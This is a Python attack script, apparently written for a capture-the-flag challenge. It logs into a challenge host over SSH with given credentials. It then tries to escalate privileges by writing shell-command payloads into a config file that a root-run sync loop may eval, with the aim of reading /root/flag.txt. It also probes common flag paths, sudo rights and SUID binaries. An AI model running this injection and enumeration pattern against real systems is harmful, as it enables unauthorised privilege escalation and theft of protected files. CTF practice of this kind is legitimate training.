#!/usr/bin/env python3
"""Ultimate final attempt"""
import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c, timeout=10):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=timeout)
    return (stdout.read() + stderr.read()).decode()

print("[*] ULTIMATE FINAL ATTEMPT - Testing actual sync-loop behavior")

# The sync-loop.sh might use eval or source the config file
# Try different payloads that would work if the config is eval'd

payloads = [
    # If the loop uses: eval $(cat sync-request.conf)
    'FLAG=$(cat /root/flag.txt); echo $FLAG > /tmp/x',
    # If it sources the file
    'cat /root/flag.txt > /tmp/y',
    # Raw command
    'cat /root/flag.txt',
]

for i, payload in enumerate(payloads):
    print(f"\n[Test {i+1}]: {payload}")
    cmd(f'echo "{payload}" > /opt/mc/config/sync-request.conf')
    time.sleep(10)
    
    # Check all tmp files
    result = cmd("cat /tmp/x /tmp/y 2>/dev/null")
    if result.strip():
        print(f"OUTPUT: {result}")
        if "tdho{" in result:
            print("\n*** FLAG FOUND ***")
            ssh.close()
            exit(0)

# Maybe the flag is actually accessible somewhere else
print("\n[Desperate measures - checking other locations]:")
locations = [
    "/root/flag.txt",  # Try direct (will fail but worth checking permission error)
    "/flag.txt",  # Common CTF location
    "/flag",
    "/home/player/flag.txt",
    "/opt/flag.txt",
    "/var/flag.txt",
]

for loc in locations:
    result = cmd(f"cat {loc} 2>&1 | head -2")
    if result.strip() and "tdho{" in result:
        print(f"FLAG at {loc}: {result}")
        ssh.close()
        exit(0)
    elif result.strip() and "Permission denied" not in result and "No such file" not in result:
        print(f"{loc}: {result[:100]}")

# Check if we can sudo
print("\n[Checking sudo]:")
print(cmd("sudo -l 2>&1 | head -5"))

# Check for SUID binaries
print("\n[Checking for SUID escape vectors]:")
print(cmd("find / -perm -4000 -type f 2>/dev/null | head -10"))

ssh.close()
print("\n[*] All methods exhausted. Challenge may require different approach or more time.")
